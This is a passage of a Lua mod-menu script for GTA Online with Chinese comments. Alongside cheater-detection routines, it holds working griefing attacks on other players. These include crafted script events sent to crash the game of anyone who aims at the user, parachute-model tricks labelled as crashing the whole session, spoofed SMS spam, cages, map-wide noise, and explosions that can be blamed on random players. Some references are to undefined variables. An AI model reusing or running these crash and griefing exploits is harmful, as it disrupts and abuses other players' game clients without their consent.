    local gas_cage = entities.create_object(gas_cage_hash, pos, 0)
    pos.z += 1
    local gas_cage2 = entities.create_object(gas_cage_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = gas_cage
    spawned_objects[#spawned_objects + 1] = gas_cage2
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage2, true)
end
------------------------------------
-------------声音恶搞---------------
------------------------------------	
function laughsound(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local voice = "A_F_M_EASTSA_01_LATINO_FULL_01"
    local speech = "FEMALE_DISTANT_LAUGH"
    local z_off = 0
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, false) then 
        z_off = get_model_size(ENTITY.GET_ENTITY_MODEL(PED.GET_VEHICLE_PED_IS_IN(target_ped, false))).z
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, -1.0, 0.0 + z_off)
    request_model_load(util.joaat("s_f_m_shop_high"))
    local voice_ped = entities.create_ped(28, util.joaat("s_f_m_shop_high"), coords, 0)
    ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(voice_ped, true, false)
    ENTITY.SET_ENTITY_VISIBLE(voice_ped, false, 0)
    ENTITY.FREEZE_ENTITY_POSITION(voice_ped, true)
    ENTITY.SET_ENTITY_INVINCIBLE(voice_ped, true)
    AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(voice_ped, speech, voice, "SPEECH_PARAMS_FORCE", 0)
    wait(1500)
    entities.delete_by_handle(voice_ped)
end

function stcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.GET_PLAYER_PED(pid), "BARRY_01_SOUNDSET", true, 2)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "External_Explosion", PLAYER.GET_PLAYER_PED(pid), "Methamphetamine_Job_Sounds", true, 1)
end

function phonesoundcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)
end

function send_player_label_sms(label, pid)
    local event_data = {-791892894, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
    local out = label:sub(1, 127)
    for i = 0, #out -1 do
        local slot = i // 8
        local byte = string.byte(out, i + 1)
        event_data[slot + 3] = event_data[slot + 3] | byte << ( (i - slot * 8) * 8)
    end
    util.trigger_script_event(1 << pid, event_data)
end

function textspoof(pid)
    if index == 1 then
        for i=1, #sexts do
            send_player_label_sms(sexts[i], pid)
        end
    else
        for i=1, 100 do
            send_player_label_sms(all_labels[math.random(1, #all_labels)], pid)
            wait()
        end
    end
    util.toast("完成")
end

------------------------------------
-------------作弊者检测-------------
------------------------------------
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

function get_transition_state(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end
function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end

local unreleased_vehicles = {
    "Sentinel4",
}

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "skylift",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}

--自由镜头无碰撞
function GetSpawnState(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
end
function free_cam()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = WIRI_PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(pid)
        wait()
        local currentpos = players.get_position(pid)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(pid)
        and GetInteriorPlayerIsIn(pid) == 0 and GetSpawnState(pid) ~= 0
        and not WIRI_PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not WIRI_PED.IS_PED_DEAD_OR_DYING(ped)
        and not WIRI_PED.IS_PED_CLIMBING(ped) and not WIRI_PED.IS_PED_VAULTING(ped) and not WIRI_PED.IS_PED_USING_SCENARIO2(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(players.get_position(players.user()), players.get_position(pid)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(pid) .. " 正在悬浮")
            break
        end
    end
end

--玩家无敌检测
function god_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                util.draw_debug_text(players.get_name(pid) .. "是无敌,很有可能是作弊者")
                break
            end
        end
    end 
end
--车辆无敌检测
function cargod_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "载具处于无敌模式")
                    break
                end
            end
        end
    end 
end
--未发布载具检测
function unreleased_car_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. "正在驾驶未发布的车辆")
            end
        end
    end
end
--无法获得武器检测
function cantgetweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and WEAPON.IS_PED_ARMED(ped, 7) then
                util.draw_debug_text(players.get_name(pid) .. "正在使用无法获得武器")
                break
            end
        end
    end
end
--无法获得载具检测
function cantgetvar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " 正在驾驶无法获得的载具,很有可能是作弊者")
                break
            end
        end
    end
end
--室内使用武器检测
function usingweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if players.is_in_interior(pid) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(pid) .. " 正在室内使用武器,极大可能是作弊者")
            break
        end
    end
end
--超级驾驶检测
function supercar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") or players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) then
            util.toast(players.get_name(pid) .. " 正在使用超级驾驶")
            break
        end
    end
end
--超级跑检测
function superrun_detection()
    for _, pid in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and get_interior_player_is_in(pid) == 0 and get_transition_state(pid) ~= 0 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 300.0 and ped_speed > 25 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(pid) .. " 是超级跑")
            break
        end
    end
end
--观看检测
function lookingyou_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if not util.is_session_transition_active() and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                    util.toast(players.get_name(pid) .. " 正在观看你")
                    break
                end
            end
        end
    end
end
--传送检测
function tp_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(pid)
            wait(1000)
            local currentpos = players.get_position(pid)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior and PLAYER.IS_PLAYER_PLAYING(pid) and players.exists(pid) then
                    util.toast(players.get_name(pid) .. " 刚刚进行了传送")
                end
            end
        end
    end
end

function roundDecimals(float, decimals)
    decimals = 10 ^ decimals
    return math.floor(float * decimals) / decimals
end


markedPlayers = {}
otrBlipColour = 58
chatSpamSettings = {
    enabled = false,
    ignoreTeam = true,
    identicalMessages = 5,
}
--天基炮检测
function orbdection()
    local playerList = players.list(false, true, true)
    for i = 1, #playerList do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[i])
        if TASK.GET_IS_TASK_ACTIVE(ped, 135) and ENTITY.GET_ENTITY_SPEED(ped) == 0 then
            local pos = NETWORK._NETWORK_GET_PLAYER_COORDS(playerList[i])
            for j = 1, #orbitalTableCords do
                if roundDecimals(pos.x, 1) == roundDecimals(orbitalTableCords[j].x, 1) and roundDecimals(pos.y, 1) == roundDecimals(orbitalTableCords[j].y, 1) and roundDecimals(pos.z, 1) == roundDecimals(orbitalTableCords[j].z, 1) then
                    util.toast(players.get_name(playerList[i]) ..' '.. '正在使用天基炮')
                end
            end
        end
    end
end

karma = {}
whitelistGroups = {user = true, friends = true, strangers  = true}
whitelistListTable = {}
whitelistedName = false

function getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    playerList = players.list(whitelistGroups.user, whitelistGroups.friends, whitelistGroups.strangers)
    notWhitelisted = {}
    for i = 1, #playerList do
        if not whitelistListTable[playerList[i]] and not (players.get_name(playerList[i]) == whitelistedName) then
            notWhitelisted[#notWhitelisted + 1] = playerList[i]
        end
    end
    return notWhitelisted
end

function isAnyPlayerTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end

function playerIsTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end

function get_spawn_state(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 232))
end

function sendscriptcrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
    end
end

function sendgobreach()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-93722397 ,1, 0, 0, 4,0,karmaPid, karmaPid})
    end
end
--Player
function GTPlayer(ped, loop, expSettings)
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
            local spped = PLAYER.PLAYER_PED_ID()
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            SelfPlayerPos.x = SelfPlayerPos.x + 10
            TTPos.x = TTPos.x + 10
            local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
            local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
            local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
            wait(3500)
            PHYSICS.DELETE_CHILD_ROPE(ropec)
            entities.delete_by_handle(pedc)
end

function sendallplayercrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        GTPlayer(karma[userPed].ped, true, expSettings)
    end
end

function explosion(pos, expSettings)
    if expSettings.currentFx then
        if expSettings.currentFx.exp then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.currentFx.exp, 10, expSettings.audible, true, 0, expSettings.noDamage)
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
        else
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
        end
        if not expSettings.invisible then
            addFx(pos, expSettings.currentFx, expSettings.colour)
        end
    else
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.expType, 10, expSettings.audible, expSettings.invisible, expSettings.camShake, expSettings.noDamage)
    end
end

JS_tbls = {}
    do
        JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
    end
    

    expLoopDelay = new.delay(250, 0, 0)
    JS_tbls.effects = {
        ['Clown Explosion'] = {
            asset  	= 'scr_rcbarry2',
            name	= 'scr_exp_clown',
            colour 	= false,
            exp     = 31,
        },
        ['Clown Appears'] = {
            asset	= 'scr_rcbarry2',
            name 	= 'scr_clown_appears',
            colour  = false,
            exp     = 71,
        },
        ['FW Trailburst'] = {
            asset 	= 'scr_rcpaparazzo1',
            name 	= 'scr_mich4_firework_trailburst_spawn',
            colour 	= true,
            exp     = 66,
        },
        ['FW Starburst'] = {
            asset	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_starburst',
            colour 	= true,
        },
        ['FW Fountain'] = {
            asset 	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_fountain',
            colour 	= true,
        },
        ['Alien Disintegration'] = {
            asset	= 'scr_rcbarry1',
            name 	= 'scr_alien_disintegrate',
            colour 	= false,
            exp     = 3,
        },
        ['Clown Flowers'] = {
            asset	= 'scr_rcbarry2',
            name	= 'scr_clown_bul',
            colour 	= false,
        },
        ['FW Ground Burst'] = {
            asset 	= 'proj_indep_firework',
            name	= 'scr_indep_firework_grd_burst',
            colour 	= false,
            exp     = 25,
        }
    }

local expSettings = {
    camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
    --stuff for fx explosions
    currentFx = JS_tbls.effects['Clown_Explosion'],
    colour = new.colour( 255, 0, 255 )
}

function explodePlayer(ped, loop, expSettings)
    pos = ENTITY.GET_ENTITY_COORDS(ped)
   --if any blame is enabled this decides who should be blamed
    blamedPlayer = PLAYER.PLAYER_PED_ID()
   if expSettings.blamedPlayer and expSettings.blamed then
       blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(expSettings.blamedPlayer)
   elseif expSettings.blamed then
        playerList = players.list(true, true, true)
       blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[math.random(1, #playerList)])
   end
   if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
       for i = 0, 50, 1 do --50 explosions to account for most armored vehicles
           if expSettings.owned or expSettings.blamed then
               ownedExplosion(blamedPlayer, pos, expSettings)
           else
               explosion(pos, expSettings)
           end
           wait(10)
       end
   elseif expSettings.owned or expSettings.blamed then
       ownedExplosion(blamedPlayer, pos, expSettings)
   else
       explosion(pos, expSettings)
   end
   wait(10)
end

function getTotalDelay(delayTable)
    return (delayTable.ms + (delayTable.s * 1000) + (delayTable.min * 1000 * 60))
end

function bulletaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[userPed].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 0.1, 100, true, 100416529, userPed, true, false, 100.0)
        wait(getTotalDelay(expLoopDelay))
    end
end

function expaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        explodePlayer(karma[userPed].ped, true, expSettings)
    end
end

function godaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] and players.is_godmode(karma[userPed].pid) then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-1388926377, karmaPid, -1762807505, math.random(0, 9999)})
    end
end






function fangkongjingbao()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
    for i = 1, #Audio_POS do
 
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    pos.z = 2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        pos.z = -2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    
    for pid = 0, 31 do
        local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        end
    end
end

--噪音
function zaoyin()		
    --{"Bed", "WastedSounds"}
        local pos = v3()
        local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
        for i = 1, #Audio_POS do
    
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = 2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = -2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    
            for pid = 0, 31 do
                local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
        end
    end		
end

--爆炸圈
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)

    local offset_x = ped_coords.x
    local offset_y = ped_coords.y

    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)

    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
 --载具伞崩全局
function carcrashv1()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 20 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        wait(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 1381105889)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        wait(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end
--人物伞崩
function personlcrashv1()
    local spped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for n = 0 , 5 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end

function personalcrashv2()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           wait()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           wait()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           wait(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")			
        end
end

function personalcrashv3()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("v_ilev_light_wardrobe_face")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("v_ilev_light_wardrobe_face")
